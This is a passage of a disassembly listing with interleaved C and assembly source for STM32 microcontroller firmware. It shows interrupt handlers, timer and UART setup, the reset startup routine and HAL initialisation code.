 8000df6:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8000df8:	bf00      	nop
 8000dfa:	46bd      	mov	sp, r7
 8000dfc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e00:	4770      	bx	lr

08000e02 <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8000e02:	b480      	push	{r7}
 8000e04:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8000e06:	bf00      	nop
 8000e08:	46bd      	mov	sp, r7
 8000e0a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e0e:	4770      	bx	lr

08000e10 <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 8000e10:	b580      	push	{r7, lr}
 8000e12:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8000e14:	f000 f9b2 	bl	800117c <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 8000e18:	bf00      	nop
 8000e1a:	bd80      	pop	{r7, pc}

08000e1c <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8000e1c:	b580      	push	{r7, lr}
 8000e1e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 8000e20:	4802      	ldr	r0, [pc, #8]	; (8000e2c <TIM2_IRQHandler+0x10>)
 8000e22:	f003 ffc1 	bl	8004da8 <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8000e26:	bf00      	nop
 8000e28:	bd80      	pop	{r7, pc}
 8000e2a:	bf00      	nop
 8000e2c:	200002e4 	.word	0x200002e4

08000e30 <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 8000e30:	b580      	push	{r7, lr}
 8000e32:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8000e34:	4802      	ldr	r0, [pc, #8]	; (8000e40 <USB_IRQHandler+0x10>)
 8000e36:	f001 f819 	bl	8001e6c <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8000e3a:	bf00      	nop
 8000e3c:	bd80      	pop	{r7, pc}
 8000e3e:	bf00      	nop
 8000e40:	20000b7c 	.word	0x20000b7c

08000e44 <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 8000e44:	b480      	push	{r7}
 8000e46:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8000e48:	4b06      	ldr	r3, [pc, #24]	; (8000e64 <SystemInit+0x20>)
 8000e4a:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8000e4e:	4a05      	ldr	r2, [pc, #20]	; (8000e64 <SystemInit+0x20>)
 8000e50:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 8000e54:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 8000e58:	bf00      	nop
 8000e5a:	46bd      	mov	sp, r7
 8000e5c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e60:	4770      	bx	lr
 8000e62:	bf00      	nop
 8000e64:	e000ed00 	.word	0xe000ed00

08000e68 <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 8000e68:	b580      	push	{r7, lr}
 8000e6a:	b088      	sub	sp, #32
 8000e6c:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 8000e6e:	f107 0310 	add.w	r3, r7, #16
 8000e72:	2200      	movs	r2, #0
 8000e74:	601a      	str	r2, [r3, #0]
 8000e76:	605a      	str	r2, [r3, #4]
 8000e78:	609a      	str	r2, [r3, #8]
 8000e7a:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8000e7c:	1d3b      	adds	r3, r7, #4
 8000e7e:	2200      	movs	r2, #0
 8000e80:	601a      	str	r2, [r3, #0]
 8000e82:	605a      	str	r2, [r3, #4]
 8000e84:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 8000e86:	4b1e      	ldr	r3, [pc, #120]	; (8000f00 <MX_TIM2_Init+0x98>)
 8000e88:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000e8c:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 8000e8e:	4b1c      	ldr	r3, [pc, #112]	; (8000f00 <MX_TIM2_Init+0x98>)
 8000e90:	f641 421f 	movw	r2, #7199	; 0x1c1f
 8000e94:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 8000e96:	4b1a      	ldr	r3, [pc, #104]	; (8000f00 <MX_TIM2_Init+0x98>)
 8000e98:	2200      	movs	r2, #0
 8000e9a:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8000e9c:	4b18      	ldr	r3, [pc, #96]	; (8000f00 <MX_TIM2_Init+0x98>)
 8000e9e:	f240 128f 	movw	r2, #399	; 0x18f
 8000ea2:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 8000ea4:	4b16      	ldr	r3, [pc, #88]	; (8000f00 <MX_TIM2_Init+0x98>)
 8000ea6:	2200      	movs	r2, #0
 8000ea8:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 8000eaa:	4b15      	ldr	r3, [pc, #84]	; (8000f00 <MX_TIM2_Init+0x98>)
 8000eac:	2200      	movs	r2, #0
 8000eae:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 8000eb0:	4813      	ldr	r0, [pc, #76]	; (8000f00 <MX_TIM2_Init+0x98>)
 8000eb2:	f003 fece 	bl	8004c52 <HAL_TIM_Base_Init>
 8000eb6:	4603      	mov	r3, r0
 8000eb8:	2b00      	cmp	r3, #0
 8000eba:	d001      	beq.n	8000ec0 <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8000ebc:	f7ff feda 	bl	8000c74 <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 8000ec0:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8000ec4:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 8000ec6:	f107 0310 	add.w	r3, r7, #16
 8000eca:	4619      	mov	r1, r3
 8000ecc:	480c      	ldr	r0, [pc, #48]	; (8000f00 <MX_TIM2_Init+0x98>)
 8000ece:	f004 f86d 	bl	8004fac <HAL_TIM_ConfigClockSource>
 8000ed2:	4603      	mov	r3, r0
 8000ed4:	2b00      	cmp	r3, #0
 8000ed6:	d001      	beq.n	8000edc <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 8000ed8:	f7ff fecc 	bl	8000c74 <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 8000edc:	2300      	movs	r3, #0
 8000ede:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 8000ee0:	2300      	movs	r3, #0
 8000ee2:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 8000ee4:	1d3b      	adds	r3, r7, #4
 8000ee6:	4619      	mov	r1, r3
 8000ee8:	4805      	ldr	r0, [pc, #20]	; (8000f00 <MX_TIM2_Init+0x98>)
 8000eea:	f004 fa4f 	bl	800538c <HAL_TIMEx_MasterConfigSynchronization>
 8000eee:	4603      	mov	r3, r0
 8000ef0:	2b00      	cmp	r3, #0
 8000ef2:	d001      	beq.n	8000ef8 <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 8000ef4:	f7ff febe 	bl	8000c74 <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 8000ef8:	bf00      	nop
 8000efa:	3720      	adds	r7, #32
 8000efc:	46bd      	mov	sp, r7
 8000efe:	bd80      	pop	{r7, pc}
 8000f00:	200002e4 	.word	0x200002e4

08000f04 <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 8000f04:	b580      	push	{r7, lr}
 8000f06:	b084      	sub	sp, #16
 8000f08:	af00      	add	r7, sp, #0
 8000f0a:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 8000f0c:	687b      	ldr	r3, [r7, #4]
 8000f0e:	681b      	ldr	r3, [r3, #0]
 8000f10:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8000f14:	d113      	bne.n	8000f3e <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 8000f16:	4b0c      	ldr	r3, [pc, #48]	; (8000f48 <HAL_TIM_Base_MspInit+0x44>)
 8000f18:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f1a:	4a0b      	ldr	r2, [pc, #44]	; (8000f48 <HAL_TIM_Base_MspInit+0x44>)
 8000f1c:	f043 0301 	orr.w	r3, r3, #1
 8000f20:	6593      	str	r3, [r2, #88]	; 0x58
 8000f22:	4b09      	ldr	r3, [pc, #36]	; (8000f48 <HAL_TIM_Base_MspInit+0x44>)
 8000f24:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f26:	f003 0301 	and.w	r3, r3, #1
 8000f2a:	60fb      	str	r3, [r7, #12]
 8000f2c:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 8000f2e:	2200      	movs	r2, #0
 8000f30:	2100      	movs	r1, #0
 8000f32:	201c      	movs	r0, #28
 8000f34:	f000 fa41 	bl	80013ba <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8000f38:	201c      	movs	r0, #28
 8000f3a:	f000 fa5a 	bl	80013f2 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 8000f3e:	bf00      	nop
 8000f40:	3710      	adds	r7, #16
 8000f42:	46bd      	mov	sp, r7
 8000f44:	bd80      	pop	{r7, pc}
 8000f46:	bf00      	nop
 8000f48:	40021000 	.word	0x40021000

08000f4c <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8000f4c:	b580      	push	{r7, lr}
 8000f4e:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 8000f50:	4b14      	ldr	r3, [pc, #80]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f52:	4a15      	ldr	r2, [pc, #84]	; (8000fa8 <MX_USART2_UART_Init+0x5c>)
 8000f54:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 8000f56:	4b13      	ldr	r3, [pc, #76]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f58:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 8000f5c:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 8000f5e:	4b11      	ldr	r3, [pc, #68]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f60:	2200      	movs	r2, #0
 8000f62:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 8000f64:	4b0f      	ldr	r3, [pc, #60]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f66:	2200      	movs	r2, #0
 8000f68:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 8000f6a:	4b0e      	ldr	r3, [pc, #56]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f6c:	2200      	movs	r2, #0
 8000f6e:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 8000f70:	4b0c      	ldr	r3, [pc, #48]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f72:	220c      	movs	r2, #12
 8000f74:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 8000f76:	4b0b      	ldr	r3, [pc, #44]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f78:	2200      	movs	r2, #0
 8000f7a:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8000f7c:	4b09      	ldr	r3, [pc, #36]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f7e:	2200      	movs	r2, #0
 8000f80:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 8000f82:	4b08      	ldr	r3, [pc, #32]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f84:	2200      	movs	r2, #0
 8000f86:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 8000f88:	4b06      	ldr	r3, [pc, #24]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f8a:	2200      	movs	r2, #0
 8000f8c:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 8000f8e:	4805      	ldr	r0, [pc, #20]	; (8000fa4 <MX_USART2_UART_Init+0x58>)
 8000f90:	f004 fa80 	bl	8005494 <HAL_UART_Init>
 8000f94:	4603      	mov	r3, r0
 8000f96:	2b00      	cmp	r3, #0
 8000f98:	d001      	beq.n	8000f9e <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 8000f9a:	f7ff fe6b 	bl	8000c74 <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 8000f9e:	bf00      	nop
 8000fa0:	bd80      	pop	{r7, pc}
 8000fa2:	bf00      	nop
 8000fa4:	20000330 	.word	0x20000330
 8000fa8:	40004400 	.word	0x40004400

08000fac <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 8000fac:	b580      	push	{r7, lr}
 8000fae:	b09e      	sub	sp, #120	; 0x78
 8000fb0:	af00      	add	r7, sp, #0
 8000fb2:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000fb4:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8000fb8:	2200      	movs	r2, #0
 8000fba:	601a      	str	r2, [r3, #0]
 8000fbc:	605a      	str	r2, [r3, #4]
 8000fbe:	609a      	str	r2, [r3, #8]
 8000fc0:	60da      	str	r2, [r3, #12]
 8000fc2:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 8000fc4:	f107 0310 	add.w	r3, r7, #16
 8000fc8:	2254      	movs	r2, #84	; 0x54
 8000fca:	2100      	movs	r1, #0
 8000fcc:	4618      	mov	r0, r3
 8000fce:	f00b ffff 	bl	800cfd0 <memset>
  if(uartHandle->Instance==USART2)
 8000fd2:	687b      	ldr	r3, [r7, #4]
 8000fd4:	681b      	ldr	r3, [r3, #0]
 8000fd6:	4a28      	ldr	r2, [pc, #160]	; (8001078 <HAL_UART_MspInit+0xcc>)
 8000fd8:	4293      	cmp	r3, r2
 8000fda:	d148      	bne.n	800106e <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 8000fdc:	2302      	movs	r3, #2
 8000fde:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 8000fe0:	2300      	movs	r3, #0
 8000fe2:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 8000fe4:	f107 0310 	add.w	r3, r7, #16
 8000fe8:	4618      	mov	r0, r3
 8000fea:	f003 fa97 	bl	800451c <HAL_RCCEx_PeriphCLKConfig>
 8000fee:	4603      	mov	r3, r0
 8000ff0:	2b00      	cmp	r3, #0
 8000ff2:	d001      	beq.n	8000ff8 <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 8000ff4:	f7ff fe3e 	bl	8000c74 <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 8000ff8:	4b20      	ldr	r3, [pc, #128]	; (800107c <HAL_UART_MspInit+0xd0>)
 8000ffa:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000ffc:	4a1f      	ldr	r2, [pc, #124]	; (800107c <HAL_UART_MspInit+0xd0>)
 8000ffe:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001002:	6593      	str	r3, [r2, #88]	; 0x58
 8001004:	4b1d      	ldr	r3, [pc, #116]	; (800107c <HAL_UART_MspInit+0xd0>)
 8001006:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001008:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800100c:	60fb      	str	r3, [r7, #12]
 800100e:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8001010:	4b1a      	ldr	r3, [pc, #104]	; (800107c <HAL_UART_MspInit+0xd0>)
 8001012:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001014:	4a19      	ldr	r2, [pc, #100]	; (800107c <HAL_UART_MspInit+0xd0>)
 8001016:	f043 0301 	orr.w	r3, r3, #1
 800101a:	64d3      	str	r3, [r2, #76]	; 0x4c
 800101c:	4b17      	ldr	r3, [pc, #92]	; (800107c <HAL_UART_MspInit+0xd0>)
 800101e:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001020:	f003 0301 	and.w	r3, r3, #1
 8001024:	60bb      	str	r3, [r7, #8]
 8001026:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 8001028:	2304      	movs	r3, #4
 800102a:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 800102c:	2302      	movs	r3, #2
 800102e:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001030:	2300      	movs	r3, #0
 8001032:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001034:	2303      	movs	r3, #3
 8001036:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 8001038:	2307      	movs	r3, #7
 800103a:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 800103c:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001040:	4619      	mov	r1, r3
 8001042:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8001046:	f000 fc67 	bl	8001918 <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 800104a:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800104e:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001050:	2302      	movs	r3, #2
 8001052:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001054:	2300      	movs	r3, #0
 8001056:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001058:	2303      	movs	r3, #3
 800105a:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 800105c:	2303      	movs	r3, #3
 800105e:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 8001060:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001064:	4619      	mov	r1, r3
 8001066:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800106a:	f000 fc55 	bl	8001918 <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 800106e:	bf00      	nop
 8001070:	3778      	adds	r7, #120	; 0x78
 8001072:	46bd      	mov	sp, r7
 8001074:	bd80      	pop	{r7, pc}
 8001076:	bf00      	nop
 8001078:	40004400 	.word	0x40004400
 800107c:	40021000 	.word	0x40021000

08001080 <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 8001080:	f8df d034 	ldr.w	sp, [pc, #52]	; 80010b8 <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 8001084:	f7ff fede 	bl	8000e44 <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 8001088:	480c      	ldr	r0, [pc, #48]	; (80010bc <LoopForever+0x6>)
  ldr r1, =_edata
 800108a:	490d      	ldr	r1, [pc, #52]	; (80010c0 <LoopForever+0xa>)
  ldr r2, =_sidata
 800108c:	4a0d      	ldr	r2, [pc, #52]	; (80010c4 <LoopForever+0xe>)
  movs r3, #0
 800108e:	2300      	movs	r3, #0
  b LoopCopyDataInit
 8001090:	e002      	b.n	8001098 <LoopCopyDataInit>

08001092 <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 8001092:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 8001094:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 8001096:	3304      	adds	r3, #4

08001098 <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 8001098:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 800109a:	428c      	cmp	r4, r1
  bcc CopyDataInit
 800109c:	d3f9      	bcc.n	8001092 <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 800109e:	4a0a      	ldr	r2, [pc, #40]	; (80010c8 <LoopForever+0x12>)
  ldr r4, =_ebss
 80010a0:	4c0a      	ldr	r4, [pc, #40]	; (80010cc <LoopForever+0x16>)
  movs r3, #0
 80010a2:	2300      	movs	r3, #0
  b LoopFillZerobss
 80010a4:	e001      	b.n	80010aa <LoopFillZerobss>

080010a6 <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 80010a6:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 80010a8:	3204      	adds	r2, #4

080010aa <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 80010aa:	42a2      	cmp	r2, r4
  bcc FillZerobss
 80010ac:	d3fb      	bcc.n	80010a6 <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 80010ae:	f00b ff97 	bl	800cfe0 <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 80010b2:	f7ff fa69 	bl	8000588 <main>

080010b6 <LoopForever>:

LoopForever:
    b LoopForever
 80010b6:	e7fe      	b.n	80010b6 <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 80010b8:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 80010bc:	20000000 	.word	0x20000000
  ldr r1, =_edata
 80010c0:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 80010c4:	0800d298 	.word	0x0800d298
  ldr r2, =_sbss
 80010c8:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 80010cc:	20001f14 	.word	0x20001f14

080010d0 <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 80010d0:	e7fe      	b.n	80010d0 <ADC1_IRQHandler>

080010d2 <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 80010d2:	b580      	push	{r7, lr}
 80010d4:	b082      	sub	sp, #8
 80010d6:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 80010d8:	2300      	movs	r3, #0
 80010da:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 80010dc:	2003      	movs	r0, #3
 80010de:	f000 f961 	bl	80013a4 <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 80010e2:	2000      	movs	r0, #0
 80010e4:	f000 f80e 	bl	8001104 <HAL_InitTick>
 80010e8:	4603      	mov	r3, r0
 80010ea:	2b00      	cmp	r3, #0
 80010ec:	d002      	beq.n	80010f4 <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 80010ee:	2301      	movs	r3, #1
 80010f0:	71fb      	strb	r3, [r7, #7]
 80010f2:	e001      	b.n	80010f8 <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 80010f4:	f7ff fe44 	bl	8000d80 <HAL_MspInit>
  }

  /* Return function status */
  return status;
 80010f8:	79fb      	ldrb	r3, [r7, #7]
}
 80010fa:	4618      	mov	r0, r3
 80010fc:	3708      	adds	r7, #8
 80010fe:	46bd      	mov	sp, r7
 8001100:	bd80      	pop	{r7, pc}
	...

08001104 <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 8001104:	b580      	push	{r7, lr}
 8001106:	b084      	sub	sp, #16
 8001108:	af00      	add	r7, sp, #0
 800110a:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 800110c:	2300      	movs	r3, #0
 800110e:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 8001110:	4b17      	ldr	r3, [pc, #92]	; (8001170 <HAL_InitTick+0x6c>)
 8001112:	781b      	ldrb	r3, [r3, #0]
 8001114:	2b00      	cmp	r3, #0
 8001116:	d023      	beq.n	8001160 <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 8001118:	4b16      	ldr	r3, [pc, #88]	; (8001174 <HAL_InitTick+0x70>)
 800111a:	681a      	ldr	r2, [r3, #0]
 800111c:	4b14      	ldr	r3, [pc, #80]	; (8001170 <HAL_InitTick+0x6c>)
 800111e:	781b      	ldrb	r3, [r3, #0]
 8001120:	4619      	mov	r1, r3
 8001122:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 8001126:	fbb3 f3f1 	udiv	r3, r3, r1
 800112a:	fbb2 f3f3 	udiv	r3, r2, r3
 800112e:	4618      	mov	r0, r3
 8001130:	f000 f96d 	bl	800140e <HAL_SYSTICK_Config>
 8001134:	4603      	mov	r3, r0
 8001136:	2b00      	cmp	r3, #0
 8001138:	d10f      	bne.n	800115a <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 800113a:	687b      	ldr	r3, [r7, #4]
 800113c:	2b0f      	cmp	r3, #15
 800113e:	d809      	bhi.n	8001154 <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 8001140:	2200      	movs	r2, #0
 8001142:	6879      	ldr	r1, [r7, #4]
 8001144:	f04f 30ff 	mov.w	r0, #4294967295
